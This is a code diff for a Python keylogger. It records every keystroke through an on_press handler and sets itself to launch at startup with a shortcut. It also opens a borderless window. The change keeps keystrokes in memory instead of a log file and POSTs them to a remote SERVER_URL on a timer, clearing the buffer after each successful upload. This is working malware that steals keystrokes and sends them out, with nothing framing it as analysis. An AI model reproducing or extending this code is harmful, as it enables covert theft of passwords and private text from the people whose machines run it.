@@ -48,28 +48,31 @@ if __name__ == "__main__":
     
     create_startup_shortcut(current_exe_path)
 
-log_file = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
-logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+log_data = []
+
+
+logging.basicConfig(level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
 
 
 def on_press(key):
     try:
-        logging.info(f"{key.char}")
+        log_data.append(f"{key.char}")
     except AttributeError:
-        logging.info(f"[{key}]")
-
+        log_data.append(f"[{key}]")
 
 def upload_log():
     while True:
         time.sleep(UPLOAD_INTERVAL)
         try:
-            with open(log_file, 'r') as f:
-                data = f.read()
+            data = ''.join(log_data)
             
-            if data.strip(): 
+            if data.strip():
                 response = requests.post(SERVER_URL, data={'log': data})
+                
                 if response.status_code == 200:
                     print("Log uploaded.")
+                    log_data.clear()
                 else:
                     print(f"Failed to upload: {response.status_code}")
         except Exception as e:
@@ -79,7 +82,7 @@ def upload_log():
 def run_gui():
     root = Tk()
     root.geometry("600x600")
-    root.overrideredirect(True)  # Hide window decorations
+    root.overrideredirect(True)  
     root.mainloop()
 
 
